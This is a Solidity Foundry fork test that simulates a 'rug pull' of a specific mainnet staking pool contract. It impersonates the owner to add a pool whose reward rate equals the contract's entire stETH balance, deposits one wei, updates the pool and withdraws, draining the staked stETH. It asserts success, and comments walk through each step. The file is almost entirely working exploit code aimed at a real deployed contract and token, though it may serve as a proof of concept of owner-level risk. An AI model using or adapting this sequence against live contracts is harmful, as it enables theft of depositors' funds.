// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

struct PoolInfo {
        address rewardToken;
        uint256 rewardPerSecond;
        uint256 accrewardPerShare;
        uint256 lastUpdateTime;
        uint256 totalShare;
    }
interface poolContract {
    function owner() external view returns (address);
    function add(
        address _reward,
        uint256 _rewardPerSecond,
        IERC20 _stakingToken,
        bool _withUpdate
    ) external;
     function deposit(uint256 _pid, uint256 _amount) payable external;
     function poolLength() external view returns (uint256 pools);
     function updatePool(uint256 _pid) external returns (PoolInfo memory pool);
     function withdraw(uint256 _pid, uint256 _amount) external;
     function poolInfo(uint index) external view returns (PoolInfo memory);
}

contract StakingPoolForkTest is Test {
    uint256 mainnetFork;
    string MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    address stakingPoolContract = 0x7f885C6c9f847a764d247056Ed4D13Dc72CEf7D0;
    address tokenToRug = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; //stETH
    address contractOwner;

     function setUp() public {
       mainnetFork = vm.createFork(MAINNET_RPC_URL);
       vm.selectFork(mainnetFork);
       //vm.rollFork(17_250_968); // code tested around this block number, uncomment if the test is not passing or change params
       contractOwner = poolContract(stakingPoolContract).owner();
       vm.prank(contractOwner); //owner has some stETH
       IERC20(tokenToRug).transfer(address(this), 1);
    }

    function testActiveFork() public {
        assertEq(vm.activeFork(), mainnetFork);
    }

    function testRug() public {
        uint256 ourBalance = IERC20(tokenToRug).balanceOf(address(this));
        uint256 contractBalanceBefore = IERC20(tokenToRug).balanceOf(stakingPoolContract);

        assertEq(ourBalance, 0);
        assertGt(contractBalanceBefore, 0);

        /*
            ~~ start the RUG as owner ~~
        */

        vm.prank(contractOwner);
        poolContract(stakingPoolContract).add(tokenToRug, contractBalanceBefore, IERC20(tokenToRug), true);

        // make deposit to the new pool and set totalShare to 1
        IERC20(tokenToRug).approve(stakingPoolContract, 1);
        uint256 poolLength = poolContract(stakingPoolContract).poolLength(); // we need pool pid that we just added
        poolContract(stakingPoolContract).deposit(poolLength - 1, 1);

        //we need new block timestamp, in reality we wait for a new block
        vm.warp(block.timestamp + 1);

        // updatePool will set accrewardPerShare to value equal or higher than rewardPerSecond (which we set as balance we want to rug)
        poolContract(stakingPoolContract).updatePool(poolLength - 1);

        // withdraw will trigger settlePendingreward which will use _safeTransfer to transfer reward token (we set it to the token we want to rug)
        poolContract(stakingPoolContract).withdraw(poolLength - 1, 1);

        /*
            check if RUG was successful
        */
        ourBalance = IERC20(tokenToRug).balanceOf(address(this));
        uint256 contractBalanceAfter = IERC20(tokenToRug).balanceOf(stakingPoolContract);
        assertEq(ourBalance, contractBalanceBefore - 1);
        assertEq(contractBalanceAfter, 1); 
    }

}